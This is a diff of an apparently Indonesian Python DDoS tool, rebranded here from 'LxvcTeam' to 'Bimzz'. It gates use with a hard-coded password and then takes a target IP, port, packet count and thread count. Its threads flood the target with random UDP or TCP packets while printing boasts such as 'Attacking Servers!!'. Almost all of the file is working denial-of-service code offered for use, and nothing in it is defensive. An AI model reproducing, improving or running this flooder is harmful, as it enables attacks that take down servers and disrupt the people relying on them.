@@ -1,14 +1,16 @@
 #!/usr/bin/env python3
 #LxvcTeamV1.2
-import time
-import random
 import socket
+import random
 import threading
 import os
+import time
+import sys
 
-os.system("clear")
-password ="Lxvc"
-
+#tampilan
+password ="BimzzDDOS"
+print("""\u001b[31m
+[Bimzz] ==> LoginMenu!!""")
 for i in range(3):
 	pwd = input("[•] PASSWORD: ")
 	j=3
@@ -24,15 +26,15 @@ time.sleep(5)
 print("[√] Berhasil Login, Wait")
 time.sleep(5)
 print("------------------------------------------------------------")
-print(" >>   Discord : Unknow#1716      <<")
-print(" >>   Tools Created By Lxvc Team <<")
-print(" >>   NOTE : DON'T ABUSE!!       <<")
+print(" >>   Discord : Bimzz#9999            <<")
+print(" >>   Tools Created By Bimzz x KyTeam <<")
+print(" >>   NOTE : DON'T ABUSE!!            <<")
 print("------------------------------------------------------------")
-ip = str(input(" LxvcTeam | Ip:"))
-port = int(input(" LxvcTeam | Port:"))
-choice = str(input(" LxvcTeam | Ddos Gak?(y/n):"))
-times = int(input(" LxvcTeam | Packets:"))
-threads = int(input(" LxvcTeam | Threads:"))
+ip = str(input(" Bimzz | Ip:"))
+port = int(input(" Bimzz | Port:"))
+choice = str(input(" Bimzz | Ddos Gak?(y/n):"))
+times = int(input(" Bimzz | Packets:"))
+threads = int(input(" Bimzz | Threads:"))
 def run():
 	data = random._urandom(1600)
 	i = random.choice(("[*]","[!]","[#]"))
@@ -42,9 +44,9 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" LXVC TEAM PRESENT ")
+			print(i +"[Bimzz] | Attacking Servers!!")
 		except:
-			print("[!] LXVC FUCKING THE SERVER !!! ")
+			print("[!] BIMZZ FUCKING THE SERVER !!! ")
 
 def run2():
 	data = random._urandom(17)
@@ -56,10 +58,10 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" LXVC TEAM PRESENT ")
+			print(i +"[Bimzz] | Attacking Servers!!")
 		except:
 			s.close()
-			print("[*] LXVC FUCKING THE SERVERS! ")
+			print("[*] BIMZZ FUCKING THE SERVERS! ")
 
 for y in range(threads):
 	if choice == 'y':
